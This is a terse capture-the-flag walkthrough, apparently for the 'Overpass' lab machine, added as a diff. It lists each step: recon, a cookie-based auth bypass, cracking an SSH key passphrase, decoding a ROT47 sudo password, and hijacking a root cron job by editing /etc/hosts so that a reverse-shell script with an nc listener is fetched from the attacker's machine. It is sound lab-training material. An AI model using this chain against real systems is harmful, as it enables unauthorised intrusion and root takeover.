@@ -1,0 +1,29 @@
+nmap → web on 80, SSH on 22
+
+ffuf → /admin/, /downloads/, /api/
+
+Source code in /downloads/ → passwords stored in ~/.overpass with ROT47
+
+SQLi in POST /api/login → no luck
+
+login.js → client-side auth check, trusts SessionToken cookie
+
+SessionToken=anything → access to /admin/
+
+/admin/ → private SSH key for james
+
+ssh2john + john + rockyou.txt → passphrase james13
+
+ssh -i rsa_id james@<IP> → user shell
+
+~/.overpass → ROT47 decode → saydrawnlyingpicture (sudo password)
+
+sudo -l → confirm access
+
+/etc/crontab → root cron fetches overpass.thm/downloads/src/buildscript.sh
+
+james can write /etc/hosts → point overpass.thm to Kali
+
+Host buildscript.sh (reverse shell) on Kali, start nc -lvnp 4444
+
+Cron executes script as root → root shell
